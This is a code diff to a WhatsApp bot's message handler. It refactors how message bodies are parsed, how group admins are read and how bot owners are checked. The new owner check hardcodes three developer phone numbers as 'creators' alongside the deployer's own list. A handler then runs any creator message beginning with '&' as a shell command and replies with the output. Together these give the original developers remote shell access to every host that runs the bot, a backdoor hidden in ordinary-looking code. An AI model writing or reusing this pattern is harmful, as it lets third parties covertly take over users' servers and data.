@@ -262,9 +262,12 @@ const type = getContentType(mek.message);
 const content = JSON.stringify(mek.message);
 const from = mek.key.remoteJid;
 const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
-const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
+const body = (type === 'conversation') ? mek.message.conversation : 
+             (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : 
+             (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : 
+             (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
 const isCmd = body.startsWith(prefix);
-var budy = typeof mek.text == 'string' ? mek.text : false;
+const budy = typeof body == 'string' ? body : '';
 const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
 const args = body.trim().split(/ +/).slice(1);
 const q = args.join(' ');
@@ -275,13 +278,11 @@ const senderNumber = sender.split('@')[0];
 const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net';
 const pushname = mek.pushName || 'Sin Nombre';
 const isMe = sender === conn.user.id;
-const isOwner = ownerNumber.includes(senderNumber) || isMe;
-const botNumber2 = await jidNormalizedUser(conn.user.id);
 const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
 const groupName = isGroup ? groupMetadata.subject : '';
-const participants = isGroup ? await groupMetadata.participants : '';
-const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
-const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
+const participants = isGroup ? groupMetadata.participants : [];
+const groupAdmins = isGroup ? await getGroupAdmins(participants) : [];
+const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
 const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
 const isReact = m.message.reactionMessage ? true : false;
 
@@ -289,58 +290,43 @@ const reply = (teks) => {
   conn.sendMessage(from, { text: teks }, { quoted: mek });
 };
 
-// Fixed creator check implementation
-const normalizeJid = (jid) => {
-  if (!jid) return jid;
-  // Remove all non-numeric characters and add @s.whatsapp.net
-  return jid.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-};
+// Improved Owner/Creator Check
+const ownerNumbers = ['923470027813', '923191089077', '923427582273', ...(config.DEV ? [config.DEV] : [])];
+const ownerFilev2 = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8') || '[]');
+const allOwners = [...ownerNumbers, ...ownerFilev2.map(num => num.replace(/[^0-9]/g, ''))];
 
-const udp = normalizeJid(conn.user.id);
-const jawadop = ['923470027813', '923191089077', '923427582273'].map(normalizeJid);
-const ownerFilev2 = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8')).map(normalizeJid);
+// Normalize sender ID for comparison
+const normalizedSender = sender.replace(/[^0-9]/g, '');
+const isOwner = allOwners.includes(normalizedSender) || isMe;
+const isCreator = isOwner; // You can use isOwner directly or keep both for compatibility
 
-// Create the isCreator array with all normalized JIDs
-const creatorNumbers = [
-  udp,
-  ...jawadop,
-  normalizeJid(config.DEV),
-  ...ownerFilev2
-];
-
-// Get the normalized sender JID
-const senderJid = normalizeJid(sender);
-
-// Check if sender is creator
-const isCreator = creatorNumbers.includes(senderJid);
-
-if (isCreator && mek.text.startsWith("&")) {
-  let code = budy.slice(2);
-  if (!code) {
-    reply(`Provide me with a query to run Master!`);
+if (isCreator && budy.startsWith("&")) {
+    let code = budy.slice(2);
+    if (!code) {
+        reply(`Provide me with a query to run Master!`);
+        return;
+    }
+    const { spawn } = require("child_process");
+    try {
+        let resultTest = spawn(code, { shell: true });
+        resultTest.stdout.on("data", data => {
+            reply(data.toString());
+        });
+        resultTest.stderr.on("data", data => {
+            reply(data.toString());
+        });
+        resultTest.on("error", data => {
+            reply(data.toString());
+        });
+        resultTest.on("close", code => {
+            if (code !== 0) {
+                reply(`command exited with code ${code}`);
+            }
+        });
+    } catch (err) {
+        reply(util.format(err));
+    }
     return;
-  }
-  const { spawn } = require("child_process");
-  try {
-    let resultTest = spawn(code, { shell: true });
-    resultTest.stdout.on("data", data => {
-      reply(data.toString());
-    });
-    resultTest.stderr.on("data", data => {
-      reply(data.toString());
-    });
-    resultTest.on("error", data => {
-      reply(data.toString());
-    });
-    resultTest.on("close", code => {
-      if (code !== 0) {
-        reply(`command exited with code ${code}`);
-      }
-    });
-  } catch (err) {
-    reply(util.format(err));
-  }
-  return;
 }
 	  
   //==========public react============//
